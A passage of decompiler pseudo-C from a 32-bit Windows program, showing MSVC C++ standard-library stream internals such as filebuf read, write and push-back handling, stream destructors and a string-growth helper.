      if ( v30 >= 0x10 )
        v11 = (void **)Block[0];
      v12 = Block;
      if ( v30 >= 0x10 )
        v12 = (void **)Block[0];
      v13 = (*(int (__thiscall **)(_DWORD, int, void **, unsigned int, int *, unsigned __int8 *, int *, char **))(**(_DWORD **)(this + 56) + 24))(
              *(_DWORD *)(this + 56),
              this + 64,
              v12,
              (unsigned int)v11 + v29,
              &v27,
              &v31,
              v32,
              &v26);
      if ( v13 < 0 )
        break;
      if ( v13 <= 1 )
      {
        v17 = Block;
        if ( v26 != (char *)&v31 )
        {
          v15 = (char *)Block[0];
          if ( v30 >= 0x10 )
            v17 = (void **)Block[0];
          v23 = v27;
          v24 = (int)v17 + v29 - v27;
          if ( v24 > 0 )
          {
            while ( 1 )
            {
              v25 = *(char *)(v24 + v23 - 1);
              --v24;
              ungetc(v25, *(FILE **)(this + 76));
              if ( v24 <= 0 )
                break;
              v23 = v27;
            }
            v15 = (char *)Block[0];
          }
          v16 = v31;
          goto LABEL_33;
        }
        v18 = Block;
        if ( v30 >= 0x10 )
          v17 = (void **)Block[0];
        v19 = v27 - (_DWORD)v17;
        v20 = v29;
        if ( v29 < v19 )
          v19 = v29;
        if ( v30 >= 0x10 )
          v18 = (void **)Block[0];
        v29 -= v19;
        memmove(v18, (char *)v18 + v19, v20 - v19 + 1);
      }
      else
      {
        if ( v13 != 3 )
          break;
        if ( v29 )
        {
          v14 = Block;
          v15 = (char *)Block[0];
          if ( v30 < 0x10 || (v14 = (void **)Block[0]) != 0 )
          {
            v31 = *(_BYTE *)v14;
            v16 = v31;
          }
          else
          {
            v31 = 0;
            *_errno() = 22;
            _invalid_parameter_noinfo();
            v15 = (char *)Block[0];
            v16 = v31;
          }
          goto LABEL_33;
        }
      }
    }
    v15 = (char *)Block[0];
    v16 = -1;
LABEL_33:
    if ( v30 >= 0x10 )
    {
      if ( v30 + 1 >= 0x1000 )
      {
        if ( ((int)Block[0] & 0x1F) != 0
          || (v21 = (char *)*((_DWORD *)v15 - 1), v21 >= v15)
          || (v22 = v15 - v21, v22 < 4)
          || v22 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v15 = v21;
      }
      j__free(v15);
    }
    return v16;
  }
  else
  {
    result = fgetc(*(FILE **)(this + 76));
    if ( result == -1 )
      return -1;
    return (unsigned __int8)result;
  }
}

//----- (0040A490) --------------------------------------------------------
int __thiscall sub_40A490(_DWORD **this)
{
  unsigned __int8 *v2; // ecx
  int result; // eax
  int v4; // edi

  v2 = (unsigned __int8 *)*this[7];
  if ( v2 && v2 < &v2[*this[11]] )
    return *v2;
  result = ((int (__thiscall *)(_DWORD **))(*this)[7])(this);
  v4 = result;
  if ( result != -1 )
  {
    ((void (__thiscall *)(_DWORD **, int))(*this)[4])(this, result);
    return v4;
  }
  return result;
}

//----- (0040A4D0) --------------------------------------------------------
int __thiscall sub_40A4D0(int this, int a2)
{
  int v2; // ebx
  unsigned int v4; // ecx
  _DWORD *v6; // ecx
  _BYTE *v7; // edx
  _DWORD *v8; // edi

  v2 = a2;
  v4 = **(_DWORD **)(this + 28);
  if ( v4 && **(_DWORD **)(this + 12) < v4 && (a2 == -1 || *(unsigned __int8 *)(v4 - 1) == a2) )
  {
    ++**(_DWORD **)(this + 44);
    --**(_DWORD **)(this + 28);
    if ( a2 == -1 )
      return 0;
    return v2;
  }
  if ( !*(_DWORD *)(this + 76) || a2 == -1 )
    return -1;
  if ( !*(_DWORD *)(this + 56) && ungetc((unsigned __int8)a2, *(FILE **)(this + 76)) != -1 )
    return v2;
  v6 = *(_DWORD **)(this + 28);
  v7 = (_BYTE *)(this + 60);
  if ( *v6 == this + 60 )
    return -1;
  v8 = *(_DWORD **)(this + 12);
  *v7 = a2;
  if ( (_BYTE *)*v8 != v7 )
  {
    *(_DWORD *)(this + 80) = *v8;
    *(_DWORD *)(this + 84) = *v6 + **(_DWORD **)(this + 44);
  }
  *v8 = v7;
  **(_DWORD **)(this + 28) = v7;
  **(_DWORD **)(this + 44) = 1;
  return a2;
}

//----- (0040A580) --------------------------------------------------------
int __thiscall sub_40A580(int this, int a2)
{
  char v3; // cl
  int result; // eax
  unsigned int v5; // edx
  _DWORD *v6; // esi
  _DWORD *v7; // ecx
  _BYTE *v8; // edx
  _DWORD *v9; // esi
  int v10; // ecx
  int v11; // edx
  int v12; // edx
  int v13; // eax
  int v14; // ecx
  void **v15; // eax
  unsigned int v16; // esi
  void **v17; // ecx
  void **v18; // edx
  int v19; // eax
  void **v20; // ecx
  size_t v21; // edi
  void **v22; // ecx
  size_t v23; // eax
  bool v24; // zf
  int v25; // ebx
  int v26; // eax
  int v27; // ecx
  void **v28; // ecx
  unsigned int v29; // eax
  char *v30; // [esp+10h] [ebp-34h] BYREF
  void **v31; // [esp+14h] [ebp-30h] BYREF
  void *Buffer[4]; // [esp+18h] [ebp-2Ch] BYREF
  unsigned int v33; // [esp+28h] [ebp-1Ch]
  unsigned int v34; // [esp+2Ch] [ebp-18h]
  char v35; // [esp+33h] [ebp-11h] BYREF
  int v36[4]; // [esp+34h] [ebp-10h] BYREF

  v3 = a2;
  if ( a2 == -1 )
    return 0;
  v5 = **(_DWORD **)(this + 32);
  if ( v5 && (v6 = *(_DWORD **)(this + 48), v5 < *v6 + v5) )
  {
    --*v6;
    v7 = *(_DWORD **)(this + 32);
    v8 = (_BYTE *)(*v7)++;
    result = a2;
    *v8 = a2;
  }
  else if ( *(_DWORD *)(this + 76) )
  {
    v9 = *(_DWORD **)(this + 12);
    if ( *v9 == this + 60 )
    {
      v10 = *(_DWORD *)(this + 80);
      v11 = *(_DWORD *)(this + 84);
      *v9 = v10;
      v12 = v11 - v10;
      **(_DWORD **)(this + 28) = v10;
      v3 = a2;
      **(_DWORD **)(this + 44) = v12;
    }
    if ( *(_DWORD *)(this + 56) )
    {
      v35 = v3;
      sub_409E40((char **)Buffer, 8u, 0);
      v36[3] = 0;
LABEL_15:
      v15 = (void **)Buffer[0];
      v16 = v34;
      while ( 1 )
      {
        v17 = Buffer;
        v18 = Buffer;
        if ( v16 >= 0x10 )
        {
          v17 = v15;
          v18 = v15;
        }
        v19 = (*(int (__thiscall **)(_DWORD, int, char *, int *, char **, void **, unsigned int, void ***))(**(_DWORD **)(this + 56) + 28))(
                *(_DWORD *)(this + 56),
                this + 64,
                &v35,
                v36,
                &v30,
                v18,
                (unsigned int)v17 + v33,
                &v31);
        if ( v19 < 0 )
          goto LABEL_35;
        if ( v19 > 1 )
          break;
        v16 = v34;
        v20 = Buffer;
        v15 = (void **)Buffer[0];
        if ( v34 >= 0x10 )
          v20 = (void **)Buffer[0];
        v21 = (char *)v31 - (char *)v20;
        if ( v31 != v20 )
        {
          v22 = Buffer;
          if ( v34 >= 0x10 )
            v22 = (void **)Buffer[0];
          v23 = fwrite(v22, 1u, v21, *(FILE **)(this + 76));
          v16 = v34;
          v24 = v21 == v23;
          v15 = (void **)Buffer[0];
          if ( !v24 )
            goto LABEL_36;
        }
        *(_BYTE *)(this + 61) = 1;
        if ( v30 != &v35 )
        {
          v25 = a2;
          goto LABEL_37;
        }
        if ( !v21 )
        {
          if ( v33 < 0x20 )
          {
            sub_40B500((char **)Buffer, 8u, 0);
            goto LABEL_15;
          }
          goto LABEL_36;
        }
      }
      if ( v19 != 3 )
      {
LABEL_35:
        v16 = v34;
        v15 = (void **)Buffer[0];
LABEL_36:
        v25 = -1;
        goto LABEL_37;
      }
      v26 = fputc(v35, *(FILE **)(this + 76));
      v16 = v34;
      v27 = -1;
      v24 = v26 == -1;
      v15 = (void **)Buffer[0];
      if ( !v24 )
        v27 = a2;
      v25 = v27;
LABEL_37:
      if ( v16 >= 0x10 )
      {
        if ( v16 + 1 >= 0x1000 )
        {
          if ( ((unsigned __int8)v15 & 0x1F) != 0
            || (v28 = (void **)*(v15 - 1), v28 >= v15)
            || (v29 = (char *)v15 - (char *)v28, v29 < 4)
            || v29 > 0x23 )
          {
            _invalid_parameter_noinfo_noreturn();
          }
          v15 = v28;
        }
        j__free(v15);
      }
      return v25;
    }
    else
    {
      v13 = fputc(v3, *(FILE **)(this + 76));
      v14 = -1;
      if ( v13 != -1 )
        return a2;
      return v14;
    }
  }
  else
  {
    return -1;
  }
  return result;
}

//----- (0040A7A0) --------------------------------------------------------
void __thiscall sub_40A7A0(FILE **this)
{
  if ( this[19] )
    _unlock_file(this[19]);
}

//----- (0040A7B0) --------------------------------------------------------
void __thiscall sub_40A7B0(FILE **this)
{
  if ( this[19] )
    _lock_file(this[19]);
}

//----- (0040A7C0) --------------------------------------------------------
void __thiscall sub_40A7C0(_DWORD *this)
{
  bool v2; // zf
  _DWORD *v3; // edi
  int v4; // edx
  int v5; // ecx
  _DWORD *v6; // esi
  int v7; // ecx
  void (__thiscall ***v8)(_DWORD, int); // eax

  v2 = this[19] == 0;
  *this = &std::filebuf::`vftable';
  if ( !v2 )
  {
    v3 = (_DWORD *)this[3];
    if ( (_DWORD *)*v3 == this + 15 )
    {
      v4 = this[21];
      v5 = this[20];
      *v3 = v5;
      *(_DWORD *)this[7] = v5;
      *(_DWORD *)this[11] = v4 - v5;
    }
  }
  if ( *((_BYTE *)this + 72) )
    sub_40BAB0((int)this);
  *this = &std::streambuf::`vftable';
  v6 = (_DWORD *)this[13];
  if ( v6 )
  {
    v7 = v6[1];
    if ( v7 )
    {
      v8 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v7 + 8))(v7);
      if ( v8 )
        (**v8)(v8, 1);
    }
    sub_414AF8(v6);
  }
}
// 435FE8: using guessed type void *std::streambuf::`vftable';
// 436028: using guessed type void *std::filebuf::`vftable';

//----- (0040A8D0) --------------------------------------------------------
char *__thiscall sub_40A8D0(char *this, int a2, __int64 a3)
{
  int v4; // eax
  int v5; // edi
  int v6; // ecx
  int v7; // eax
  char *v8; // ecx
  int v9; // ecx
  __int64 v10; // rax
  char *v11; // ecx
  int v12; // edx
  char v13; // al
  int v14; // ecx
  _DWORD v16[6]; // [esp+0h] [ebp-34h] BYREF
  bool v17; // [esp+18h] [ebp-1Ch]
  int v18; // [esp+1Ch] [ebp-18h]
  char *v19; // [esp+20h] [ebp-14h]
  _DWORD *v20; // [esp+24h] [ebp-10h]
  int v21; // [esp+30h] [ebp-4h]

  v20 = v16;
  v19 = this;
  v4 = *(_DWORD *)this;
  v5 = 0;
  v18 = 0;
  v16[5] = this;
  v6 = *(_DWORD *)&this[*(_DWORD *)(v4 + 4) + 56];
  if ( v6 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
  v21 = 0;
  v7 = *(_DWORD *)(*(_DWORD *)this + 4);
  if ( !*(_DWORD *)&this[v7 + 12] )
  {
    v8 = *(char **)&this[v7 + 60];
    if ( v8 )
    {
      if ( v8 != this )
        sub_40BE10(v8);
    }
  }
  v9 = *(_DWORD *)(*(_DWORD *)this + 4);
  v17 = *(_DWORD *)&this[v9 + 12] == 0;
  v21 = 1;
  if ( v17 )
  {
    if ( a3 > 0 )
    {
      LOBYTE(v21) = 2;
      LODWORD(v10) = (*(int (__thiscall **)(_DWORD, int, _DWORD, _DWORD))(**(_DWORD **)&this[v9 + 56] + 36))(
                       *(_DWORD *)&this[v9 + 56],
                       a2,
                       a3,
                       HIDWORD(a3));
      if ( v10 != a3 )
        v5 = 4;
      v21 = 1;
    }
  }
  else
  {
    v5 = 4;
  }
  v11 = &this[*(_DWORD *)(*(_DWORD *)this + 4)];
  if ( v5 )
  {
    v12 = v5 | *((_DWORD *)v11 + 3);
    v13 = v12 | 4;
    if ( *((_DWORD *)v11 + 14) )
      v13 = v12;
    sub_4043E0(v11, v13, 0);
  }
  v21 = 4;
  if ( !(unsigned __int8)j____uncaught_exception(v11) )
    sub_40BEE0(this);
  LOBYTE(v21) = 5;
  v14 = *(_DWORD *)&this[*(_DWORD *)(*(_DWORD *)this + 4) + 56];
  if ( v14 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v14 + 8))(v14);
  return this;
}
// 40A986: variable 'v10' is possibly undefined
// 40A9F6: variable 'v11' is possibly undefined
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (0040AA60) --------------------------------------------------------
int __thiscall sub_40AA60(_DWORD *this)
{
  int v1; // edx
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 6) + 4) - 24) = &std::istream::`vftable';
  v1 = *(_DWORD *)(*(this - 6) + 4);
  result = v1 - 24;
  *(_DWORD *)((char *)this + v1 - 28) = v1 - 24;
  return result;
}
// 442350: using guessed type void *std::istream::`vftable';

//----- (0040AA90) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

//----- (0040AAA0) --------------------------------------------------------
void *__thiscall sub_40AAA0(void *this, int a2, int a3, int a4)
{
  return this;
}

//----- (0040AAB0) --------------------------------------------------------
int __stdcall sub_40AAB0(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int result; // eax

  *(_DWORD *)a1 = -1;
  result = a1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0040AAF0) --------------------------------------------------------
int __stdcall sub_40AAF0(int a1, int a2, int a3, int a4, int a5)
{
  int result; // eax

  *(_DWORD *)a1 = -1;
  result = a1;
  *(_DWORD *)(a1 + 4) = -1;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  return result;
}

//----- (0040AB30) --------------------------------------------------------
unsigned int __thiscall sub_40AB30(_DWORD **this, unsigned __int8 *Src, __int64 a3)
{
  int v3; // edi
  size_t v4; // esi
  __int64 v5; // rax
  size_t v6; // ebx
  bool v7; // cf
  unsigned int v9; // [esp+Ch] [ebp-14h]
  unsigned int v10; // [esp+10h] [ebp-10h]
  _DWORD **v11; // [esp+14h] [ebp-Ch]
  int v12; // [esp+18h] [ebp-8h]

  v3 = HIDWORD(a3);
  v11 = this;
  if ( a3 < 0 )
    return 0;
  v4 = a3;
  if ( a3 <= 0 )
    return 0;
  v9 = 0;
  v10 = 0;
  do
  {
    v5 = sub_40BCE0(this);
    v12 = HIDWORD(v5);
    v6 = v5;
    if ( v5 <= 0 )
    {
      if ( ((int (__thiscall *)(_DWORD **, _DWORD))(*v11)[3])(v11, *Src) == -1 )
        return v10;
      this = v11;
      ++Src;
      v9 = (__PAIR64__(v9, v10++) + 1) >> 32;
      v3 = (__PAIR64__(v3, v4--) - 1) >> 32;
    }
    else
    {
      if ( __SPAIR64__(v3, v4) < v5 )
      {
        v6 = v4;
        v12 = v3;
      }
      memmove_0((void *)*v11[8], Src, v6);
      Src += v6;
      v7 = __CFADD__(v6, v10);
      v10 += v6;
      v9 += v12 + v7;
      this = v11;
      v3 = (__PAIR64__(v3, v4) - __PAIR64__(v12, v6)) >> 32;
      v4 -= v6;
      *v11[12] -= v6;
      *v11[8] += v6;
    }
  }
  while ( v3 > 0 || v3 >= 0 && v4 );
  return v10;
}

//----- (0040AC40) --------------------------------------------------------
unsigned int __thiscall sub_40AC40(_DWORD **this, char *a2, __int64 a3)
{
  int v3; // edi
  size_t v4; // esi
  __int64 v5; // rax
  size_t v6; // ebx
  bool v7; // cf
  int v8; // eax
  unsigned int v10; // [esp+Ch] [ebp-14h]
  unsigned int v11; // [esp+10h] [ebp-10h]
  _DWORD **v12; // [esp+14h] [ebp-Ch]
  int v13; // [esp+18h] [ebp-8h]

  v3 = HIDWORD(a3);
  v12 = this;
  if ( a3 < 0 )
    return 0;
  v4 = a3;
  if ( a3 <= 0 )
    return 0;
  v10 = 0;
  v11 = 0;
  do
  {
    v5 = sub_40BD00(this);
    v13 = HIDWORD(v5);
    v6 = v5;
    if ( v5 <= 0 )
    {
      v8 = ((int (__thiscall *)(_DWORD **))(*v12)[7])(v12);
      if ( v8 == -1 )
        return v11;
      *a2++ = v8;
      v10 = (__PAIR64__(v10, v11++) + 1) >> 32;
      v7 = v4-- != 0;
      this = v12;
      v3 = v7 + v3 - 1;
    }
    else
    {
      if ( __SPAIR64__(v3, v4) < v5 )
      {
        v6 = v4;
        v13 = v3;
      }
      memmove_0(a2, (const void *)*v12[7], v6);
      a2 += v6;
      v7 = __CFADD__(v6, v11);
      v11 += v6;
      v10 += v13 + v7;
      this = v12;
      v3 = (__PAIR64__(v3, v4) - __PAIR64__(v13, v6)) >> 32;
      v4 -= v6;
      *v12[11] -= v6;
      *v12[7] += v6;
    }
  }
  while ( v3 > 0 || v3 >= 0 && v4 );
  return v11;
}

//----- (0040AD40) --------------------------------------------------------
int __thiscall sub_40AD40(_DWORD **this)
{
  int result; // eax
  _DWORD *v3; // ecx
  unsigned __int8 *v4; // edx

  result = ((int (__thiscall *)(_DWORD **))(*this)[6])(this);
  if ( result != -1 )
  {
    --*this[11];
    v3 = this[7];
    v4 = (unsigned __int8 *)(*v3)++;
    return *v4;
  }
  return result;
}

//----- (0040AD70) --------------------------------------------------------
int sub_40AD70()
{
  return -1;
}

//----- (0040AD80) --------------------------------------------------------
__int64 sub_40AD80()
{
  return 0i64;
}

//----- (0040AD90) --------------------------------------------------------
int __stdcall sub_40AD90(int a1)
{
  return -1;
}

//----- (0040ADA0) --------------------------------------------------------
void __thiscall sub_40ADA0(struct std::ios_base *this)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';

//----- (0040ADF0) --------------------------------------------------------
char *__thiscall sub_40ADF0(_DWORD *this, char a2)
{
  _DWORD *v2; // esi

  v2 = this - 30;
  sub_409B60(this - 30);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v2);
  return (char *)v2;
}

//----- (0040AE20) --------------------------------------------------------
char *__thiscall sub_40AE20(struct std::ios_base *this, char a2)
{
  char *v3; // edi

  v3 = (char *)this - 104;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 26) + 4) - 104) = &std::ofstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)this - 26) + 4)
                                                                            - 104;
  sub_40A7C0((_DWORD *)this - 25);
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 26) + 4) - 104) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)this - 26) + 4)
                                                                            - 8;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v3);
  return v3;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442330: using guessed type void *std::ofstream::`vftable';

//----- (0040AED0) --------------------------------------------------------
char *__thiscall sub_40AED0(struct std::ios_base *this, char a2)
{
  char *v3; // edi

  v3 = (char *)this - 112;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 28) + 4) - 112) = &std::ifstream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 28) + 4) - 116) = *(_DWORD *)(*((_DWORD *)this - 28) + 4)
                                                                            - 112;
  sub_40A7C0((_DWORD *)this - 24);
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 28) + 4) - 112) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 28) + 4) - 116) = *(_DWORD *)(*((_DWORD *)this - 28) + 4)
                                                                            - 24;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v3);
  return v3;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 442350: using guessed type void *std::istream::`vftable';
// 442368: using guessed type void *std::ifstream::`vftable';

//----- (0040AF80) --------------------------------------------------------
_DWORD *__thiscall sub_40AF80(_DWORD *Block, char a2)
{
  sub_40A7C0(Block);
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}

//----- (0040AFC0) --------------------------------------------------------
char *__thiscall sub_40AFC0(struct std::ios_base *this, char a2)
{
  char *v2; // edi

  v2 = (char *)this - 32;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 32) = &std::iostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 36) = *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 32;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 4) + 4) - 16) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 4) + 4) - 20) = *(_DWORD *)(*((_DWORD *)this - 4) + 4) - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 32) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 36) = *(_DWORD *)(*((_DWORD *)this - 8) + 4) - 24;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v2);
  return v2;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442338: using guessed type void *std::iostream::`vftable';
// 442350: using guessed type void *std::istream::`vftable';

//----- (0040B080) --------------------------------------------------------
char *__thiscall sub_40B080(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 8;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 12) = *(_DWORD *)(*((_DWORD *)this - 2) + 4) - 8;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v2);
  return v2;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';

//----- (0040B100) --------------------------------------------------------
int __thiscall sub_40B100(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (0040B150) --------------------------------------------------------
char *__thiscall sub_40B150(struct std::ios_base *this, char a2)
{
  char *v2; // esi

  v2 = (char *)this - 24;
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24) = &std::istream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 28) = *(_DWORD *)(*((_DWORD *)this - 6) + 4) - 24;
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(v2);
  return v2;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 442350: using guessed type void *std::istream::`vftable';

//----- (0040B1D0) --------------------------------------------------------
_DWORD *__thiscall sub_40B1D0(_DWORD *Block, char a2)
{
  _DWORD *v3; // edi
  int v4; // ecx
  void (__thiscall ***v5)(_DWORD, int); // eax

  v3 = (_DWORD *)Block[13];
  *Block = &std::streambuf::`vftable';
  if ( v3 )
  {
    v4 = v3[1];
    if ( v4 )
    {
      v5 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v4 + 8))(v4);
      if ( v5 )
        (**v5)(v5, 1);
    }
    sub_414AF8(v3);
  }
  if ( (a2 & 1) != 0 )
    sub_414AF8(Block);
  return Block;
}
// 435FE8: using guessed type void *std::streambuf::`vftable';

//----- (0040B260) --------------------------------------------------------
struct std::ios_base *__thiscall sub_40B260(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_414AF8(this);
  return this;
}
// 435FE0: using guessed type void *std::ios_base::`vftable';

//----- (0040B2C0) --------------------------------------------------------
void __thiscall sub_40B2C0(char *this)
{
  char *v1; // edx

  v1 = this + 8;
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 8] = &std::ostream::`vftable';
  *(_DWORD *)&v1[*(_DWORD *)(*(_DWORD *)this + 4) - 12] = *(_DWORD *)(*(_DWORD *)this + 4) - 8;
  *((_DWORD *)this + 2) = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor((struct std::ios_base *)(this + 8));
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';

//----- (0040B330) --------------------------------------------------------
int __thiscall sub_40B330(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (0040B380) --------------------------------------------------------
unsigned int __stdcall sub_40B380(int a1, int a2, int a3, unsigned int a4)
{
  unsigned int result; // eax

  result = a3 - a2;
  if ( a4 < a3 - a2 )
    return a4;
  return result;
}

//----- (0040B3C0) --------------------------------------------------------
int __stdcall sub_40B3C0(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7)
{
  *a4 = a2;
  *a7 = a5;
  return 3;
}

//----- (0040B3E0) --------------------------------------------------------
char sub_40B3E0()
{
  return 1;
}

//----- (0040B3F0) --------------------------------------------------------
int __thiscall sub_40B3F0(_BYTE **this)
{
  int result; // eax
  int v3; // ecx

  if ( !(unsigned __int8)j____uncaught_exception(this) )
    sub_40BEE0(*this);
  result = *(_DWORD *)(*(_DWORD *)*this + 4);
  v3 = *(_DWORD *)&(*this)[result + 56];
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}
// 41398B: using guessed type int __fastcall j____uncaught_exception(_DWORD);

//----- (0040B460) --------------------------------------------------------
_BYTE *__thiscall sub_40B460(_BYTE *this, char *a2)
{
  int v3; // ecx
  int v4; // eax
  char *v5; // ecx

  *(_DWORD *)this = a2;
  v3 = *(_DWORD *)&a2[*(_DWORD *)(*(_DWORD *)a2 + 4) + 56];
  if ( v3 )
    (*(void (__thiscall **)(int))(*(_DWORD *)v3 + 4))(v3);
  v4 = *(_DWORD *)(*(_DWORD *)a2 + 4);
  if ( !*(_DWORD *)&a2[v4 + 12] )
  {
    v5 = *(char **)&a2[v4 + 60];
    if ( v5 )
    {
      if ( v5 != a2 )
        sub_40BE10(v5);
    }
  }
  this[4] = *(_DWORD *)&a2[*(_DWORD *)(*(_DWORD *)a2 + 4) + 12] == 0;
  return this;
}

//----- (0040B4F0) --------------------------------------------------------
void __noreturn sub_40B4F0()
{
  sub_4134BF((int)"invalid vector<T> subscript");
}

//----- (0040B500) --------------------------------------------------------
char **__thiscall sub_40B500(char **Src, size_t Size, char a3)
{
  unsigned int v4; // ecx
  char *v5; // esi
  char **v6; // eax
  char **result; // eax
  size_t v8; // edx
  char *v9; // eax
  char *v10; // ebx
  char *v11; // esi
  char *v12; // eax
  unsigned int v13; // ebx
  char *v14; // esi
  unsigned int v15; // [esp+Ch] [ebp-14h]
  size_t v16; // [esp+14h] [ebp-Ch]
  char *v17; // [esp+14h] [ebp-Ch]
  char **v18; // [esp+18h] [ebp-8h]
  int v19; // [esp+18h] [ebp-8h]
  unsigned int v20; // [esp+18h] [ebp-8h]

  v4 = (unsigned int)Src[5];
  v5 = Src[4];
  v15 = v4;
  if ( Size > v4 - (unsigned int)v5 )
  {
    if ( 0x7FFFFFFF - (int)v5 < Size )
      sub_401F10();
    v8 = 0x7FFFFFFF;
    v19 = 0x7FFFFFFF;
    v16 = (unsigned int)&v5[Size] | 0xF;
    if ( v16 <= 0x7FFFFFFF )
    {
      v20 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        v8 = (unsigned int)&v5[Size] | 0xF;
        if ( v16 < v4 + v20 )
          v8 = v4 + v20;
      }
      v19 = v8;
    }
    v9 = (char *)sub_401C70(__CFADD__(v8, 1) ? -1 : v8 + 1);
    Src[4] = &v5[Size];
    v17 = v9;
    Src[5] = (char *)v19;
    if ( v15 < 0x10 )
    {
      memmove_0(v9, Src, (size_t)v5);
      v14 = &v5[(_DWORD)v17];
      memset(v14, a3, Size);
      v14[Size] = 0;
      *Src = v17;
      return Src;
    }
    else
    {
      v10 = *Src;
      memmove_0(v9, *Src, (size_t)v5);
      v11 = &v5[(_DWORD)v17];
      memset(v11, a3, Size);
      v11[Size] = 0;
      if ( v15 + 1 >= 0x1000 )
      {
        if ( ((unsigned __int8)v10 & 0x1F) != 0
          || (v12 = (char *)*((_DWORD *)v10 - 1), v12 >= v10)
          || (v13 = v10 - v12, v13 < 4)
          || v13 > 0x23 )
        {
          _invalid_parameter_noinfo_noreturn();
        }
        v10 = v12;
      }
      j__free(v10);
      *Src = v17;
      return Src;
    }
  }
  else
  {
    v18 = Src;
    Src[4] = &v5[Size];
    v6 = Src;
    if ( v4 >= 0x10 )
    {
      v6 = (char **)*Src;
